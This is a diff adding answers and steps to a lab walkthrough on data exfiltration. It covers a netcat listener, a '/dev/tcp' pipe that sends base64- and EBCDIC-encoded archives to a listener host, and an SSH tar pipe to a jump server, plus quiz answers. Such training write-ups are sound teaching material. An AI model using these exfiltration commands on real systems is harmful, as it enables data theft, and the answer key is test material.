@@ -23,49 +23,82 @@ This guide contains the answer and steps necessary to get to them for the [Data 
 
 1. In which case scenario will sending and receiving traffic continue during the connection?
 
+   This answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>Tunneling</details>
 
 2. In which case scenario will sending and receiving traffic be in one direction?
 
+   This answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>Traditional data exfiltration</details>
 
 3. In the next task, we will be discussing how data exfiltration over the TCP socket works!
-
-
-
-   ><details><summary>Click for answer</summary></details>
 
 ### Exfiltration using TCP socket
 
 1. Exfiltration using TCP sockets relies on ____________ protocols!
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>Non-standard</details>
 
 2. Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hitCompletedto move on to the next task!
 
+   We need to ssh into the jump server and setup a listener that outputs the result to a file.
 
+   ```console
+   ssh thm@10.10.66.20
+   nc -nlvp 1337 > /tmp/task4-creds.data
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   Next we ssh into the victim1 machine through the jumpserver.
+
+   ```console
+   ssh thm@10.10.66.20
+   ssh thm@victim1.thm.com
+   ```
+
+   TCP LISTENER
+
+   Next we compress and encode the data we want to exfiltrate in the 'task4' folder.
+
+   ```console
+   tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/1337
+   ```
+
+   This command will also send the data over the TCP socket.
+
+   TCP EXFILTRATE
+
+   Now that the files have been transfered to the jump server, we can decode en decompress the archive to get to the files.
+
+   ```console
+   dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
+   tar xvf task4-creds.tar
+   ```
+
+   TCP FILES
 
 ### Exfiltration using SSH
 
 1. All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>T</details>
 
 2. Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hitCompletedand move on to the next task!
 
+   On victim 1 we can archive the folder and send it directly through the SSH client.
 
+   ```console
+   tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   SSH EXFILTRATE
+
+   SSH FILES
 
 ### Exfiltrate using HTTP(S)
 
